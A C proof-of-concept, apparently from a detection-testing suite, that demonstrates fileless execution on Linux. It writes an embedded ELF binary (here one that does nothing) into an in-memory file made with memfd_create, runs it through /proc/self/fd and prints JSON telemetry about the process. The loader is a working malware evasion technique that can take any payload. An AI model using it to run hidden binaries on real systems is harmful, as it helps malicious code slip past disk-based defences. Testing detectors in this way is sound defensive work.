/* Skeleton PoC */

/* Adapted from https://x-c3ll.github.io/posts/fileless-memfd_create/ */

#define _GNU_SOURCE


#include <dlfcn.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/utsname.h>
#include <unistd.h>

#include "malware/malware_elf_binary.h"
#include "common.h"


#define SHM_NAME "IceIceBaby"
#define MEMFD_FLAGS (1)

// Detect if kernel is < or => than 3.17
int kernel_version() {
        struct utsname buffer;
        uname(&buffer);

        char *token;
        char *separator = ".";

        token = strtok(buffer.release, separator);
        if (atoi(token) < 3) {
                return 0;
        }
        else if (atoi(token) > 3){
                return 1;
        }

        token = strtok(NULL, separator);
        if (atoi(token) < 17) {
                return 0;
        }
        else {
                return 1;
        }
}

// Returns a file descriptor where we can write our shared object
int open_ramfs(void) {
        int shm_fd;

        if (kernel_version() == 0) {
            fprintf(stderr, "Aborting..kernel too old - cannot run memfd_create PoC\n");
            exit(-1);
        } else {
                shm_fd = memfd_create(SHM_NAME, MEMFD_FLAGS);
                if (shm_fd < 0) { //Something went wrong :(
                        fprintf(stderr, "[- Could not open file descriptor\n");
                        exit(-1);
                }
        }
        return shm_fd;
}

// Callback to write the shared object
void write_data (void *ptr, size_t size, int shm_fd) {
        if (write(shm_fd, ptr, size) < 0) {
                fprintf(stderr, "[-] Could not write file :'(\n");
                close(shm_fd);
                exit(-1);
        }
        fprintf(stderr, "[+] File written!\n");
}

// Load the shared object
void load_so(int shm_fd) {
        char path[1024];

        fprintf(stderr, "[+] Trying to load Shared Object!\n");
        snprintf(path, 1024, "/proc/%d/fd/%d", getpid(), shm_fd);
        char *argv[] = {path, (char *)NULL};
        execv(path, argv); // replace the curr
        perror("execv error");
        exit(-1);
}


// Utility function to convert memfd_create flags to a JSON-friendly format
void flags_to_json(unsigned long flags, char *json, size_t json_size) {
    // from linux/memfd.h:
    //
    /* flags for memfd_create(2) (unsigned int) */
    #define MFD_CLOEXEC         0x0001U
    #define MFD_ALLOW_SEALING   0x0002U
    #define MFD_HUGETLB         0x0004U
    /* not executable and sealed to prevent changing to executable. */
    #define MFD_NOEXEC_SEAL     0x0008U
    /* executable */
    #define MFD_EXEC            0x0010U

    snprintf(json, json_size, "{ \"value\": %lu, \"mfd_cloexec\": %s, \"mfd_allow_sealing\": %s, \"mfd_hugetlb\": %s, \"mfd_noexec_seal\": %s, \"mfd_exec\": %s }",
        flags,
        (flags & MFD_CLOEXEC) ? "true" : "false",
        (flags & MFD_ALLOW_SEALING) ? "true" : "false",
        (flags & MFD_HUGETLB) ? "true" : "false",
        (flags & MFD_NOEXEC_SEAL) ? "true" : "false",
        (flags & MFD_EXEC) ? "true" : "false");
}

int main (int argc, char **argv) {
        char pid_info[8192];
        gen_pid_info_json(pid_info, sizeof(pid_info));

        char flags_json[256];
        int shm_fd;

        fprintf(stderr, "PID of the PoC is: %d\n", getpid());

        fprintf(stderr, "[+] Trying to reach C&C & start download...\n");
        shm_fd = open_ramfs(); // Give me a file descriptor to memory
        write_data(binary_that_does_nothing, binary_that_does_nothing_len, shm_fd); // do_nothing.c binary

        flags_to_json((unsigned long)MEMFD_FLAGS, flags_json, sizeof(flags_json));
        printf("{ \"pid_info\": %s, \"flags\": %s, \"filename\": \"%s\" }\n", pid_info, flags_json, SHM_NAME);
        fflush(stdout);
        load_so(shm_fd);

        exit(0);
}

